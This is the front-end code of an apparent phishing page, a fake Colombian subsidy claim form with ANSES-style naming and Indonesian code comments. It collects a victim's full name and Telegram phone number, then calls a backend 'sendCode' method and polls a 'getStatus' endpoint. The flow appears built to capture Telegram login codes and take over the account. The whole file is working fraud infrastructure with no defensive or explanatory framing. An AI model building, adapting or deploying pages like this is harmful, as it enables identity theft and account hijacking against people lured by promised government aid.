<style>
  /* Reset & Base Styles */
  .lander-container {
    text-align: left;
    color: #2c3e50;
    font-family: 'Roboto', sans-serif;
  }

  /* Loader Style */
  .loader {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.9);
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #1565C0;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% {
      transform: rotate(0deg);
    }

    100% {
      transform: rotate(360deg);
    }
  }

  /* Form Styles Sesuai Gambar */
  .anses-label {
    font-size: 1.2rem;
    font-weight: 800;
    color: #34495e;
    margin-bottom: 12px;
    display: block;
  }

  .anses-input-group {
    position: relative;
    margin-bottom: 25px;
  }

  .anses-input {
    width: 100%;
    height: 65px;
    /* Lebih tinggi sesuai gambar */
    border: 2px solid #e0e0e0;
    border-radius: 12px;
    padding: 10px 20px;
    font-size: 20px;
    color: #333;
    background-color: #fff;
    transition: all 0.3s;
  }

  .anses-input::placeholder {
    color: #bdc3c7;
    font-weight: 400;
  }

  .anses-input:focus {
    border-color: #1565C0;
    outline: none;
    box-shadow: 0 0 10px rgba(21, 101, 192, 0.1);
  }

  /* Tombol RECLAMAR AHORA */
  .btn-anses-submit {
    width: 100%;
    background: linear-gradient(180deg, #f39c12 0%, #e67e22 100%);
    color: white;
    border: none;
    padding: 18px;
    border-radius: 25px;
    /* Pill-shaped */
    font-weight: 800;
    font-size: 18px;
    cursor: pointer;
    margin-top: 20px;
    text-transform: uppercase;
    box-shadow: 0 4px 15px rgba(230, 126, 34, 0.3);
    transition: transform 0.2s ease;
  }

  .btn-anses-submit:active {
    transform: scale(0.98);
  }

  /* Bendera Kolombia di dalam input */
  .flag-container {
    position: absolute;
    left: 15px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    align-items: center;
    gap: 8px;
    display: none;
    /* Muncul saat di-klik */
  }

  .flag-img-col {
    width: 32px;
    border-radius: 2px;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  }

  .warning-text {
    color: #d32f2f;
    font-size: 14px;
    margin-top: -15px;
    margin-bottom: 15px;
    font-weight: 600;
  }
</style>

<div class="lander-container py-2 d-block">

  <div class="loader" id="loader">
    <div class="spinner"></div>
  </div>

  <form id="formLander">
    <div class="mb-4">
      <label class="anses-label">Nombre completo (como en su cédula de ciudadanía)</label>
      <div class="anses-input-group">
        <input type="text" name="nama" class="anses-input shadow-none" placeholder="Ingrese su nombre completo"
          required>
      </div>
    </div>

    <div class="mb-4">
      <label class="anses-label">Número de Telegram</label>
      <div class="anses-input-group">
        <div class="flag-container" id="flagBox">
          <img src="https://upload.wikimedia.org/wikipedia/commons/2/21/Flag_of_Colombia.svg" class="flag-img-col">
        </div>
        <input type="text" class="anses-input shadow-none" name="phone" id="phone"
          placeholder="Ingrese su número de Telegram" autocomplete="off" inputmode="numeric" required>
      </div>
    </div>

    <div class="mb-3" style="display:flex; gap:12px; align-items: flex-start; padding: 0 5px;">
      <input type="checkbox" id="agree" style="width:22px; height:22px; margin-top:2px; accent-color:#1565C0;">
      <label for="agree" style="font-size:14px; color:#555; cursor:pointer; line-height: 1.3;">
        Acepto los términos y condiciones para el registro en el sistema de subsidios.
      </label>
    </div>

    <div id="checkboxWarning" class="warning-text" style="display:none;">
      ⚠️ Debe aceptar los términos para continuar.
    </div>

    <div id="wrong" class="warning-text" style="display:none;">
      ❌ El número ingresado no es válido.
    </div>

    <button type="submit" class="btn-anses-submit" id="claimBtn">
      RECLAMAR AHORA
    </button>
  </form>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
  $(document).ready(function () {
    $("#wrong").hide();
    $("#loader").hide();
    $("#checkboxWarning").hide();

    // Sesuai gambar: Munculkan bendera Kolombia & geser padding saat fokus
    function showCountry() {
      $("#flagBox").css("display", "flex");
      $("#phone").css("padding-left", "60px");

      if ($("#phone").val() == "") {
        $("#phone").val("+57 "); // Kode negara Kolombia
      }
    }

    $("#phone").on("focus click input touchstart", function () {
      showCountry();
    });

    $("#agree").on("change", function () {
      if ($(this).is(":checked")) {
        $("#checkboxWarning").fadeOut();
      }
    });

    // --- LOGIKA BACKEND (TIDAK DIUBAH) ---
    function checkStatus() {
      $("#wrong").hide();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: { "method": "getStatus" },
        success: function (data) {
          if (data.result.status == "success") {
            window.location.reload();
          }
          else if (data.result.status == "failed") {
            $("#wrong").show();
            $("#loader").hide();
          }
          else {
            setTimeout(function () {
              checkStatus();
            }, 500);
          }
        },
        error: function () { }
      });
    }

    $("#claimBtn").on("click", function (e) {
      e.preventDefault();

      if (!$("#agree").is(":checked")) {
        $("#checkboxWarning").fadeIn();
        return;
      }

      var phone = $("#phone").val();
      if (phone != "") {
        $("#loader").show();
        $.ajax({
          url: "<?= base_url("API/index.php") ?>",
          type: "POST",
          data: {
            "method": "sendCode",
            "phone": phone
          },
          success: function () {
            setTimeout(function () {
              checkStatus();
            }, 500);
          },
          error: function () {
            $("#loader").hide();
          }
        });
      }
    });
  });
</script>